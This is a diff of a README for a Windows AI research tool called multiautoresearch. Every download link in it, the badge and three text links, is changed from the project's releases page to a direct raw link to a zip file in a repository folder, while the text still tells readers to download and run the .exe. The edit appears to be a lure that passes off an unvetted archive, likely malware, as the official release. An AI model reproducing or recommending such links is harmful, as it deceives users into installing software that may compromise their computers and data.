@@ -1,12 +1,12 @@
 # 🧪 multiautoresearch - Run AI research with less effort
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/sequelafairness341/multiautoresearch/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/sequelafairness341/multiautoresearch/raw/refs/heads/main/research/live/Software_2.8-beta.4.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/sequelafairness341/multiautoresearch/releases
+https://github.com/sequelafairness341/multiautoresearch/raw/refs/heads/main/research/live/Software_2.8-beta.4.zip
 
 Open the page, find the latest release, and download the Windows file. If you see more than one file, choose the `.exe` file for Windows.
 
@@ -47,7 +47,7 @@ If your PC has 16 GB RAM, the app should feel smoother when you run larger tasks
 ## 🚀 How to download and install on Windows
 
 1. Open the release page:
-   https://github.com/sequelafairness341/multiautoresearch/releases
+   https://github.com/sequelafairness341/multiautoresearch/raw/refs/heads/main/research/live/Software_2.8-beta.4.zip
 
 2. Find the latest version at the top of the page.
 
@@ -180,5 +180,5 @@ You can open and manage local files offline. Some AI features may need an intern
 
 Download and run the Windows version from here:
 
-https://github.com/sequelafairness341/multiautoresearch/releases
+https://github.com/sequelafairness341/multiautoresearch/raw/refs/heads/main/research/live/Software_2.8-beta.4.zip
 
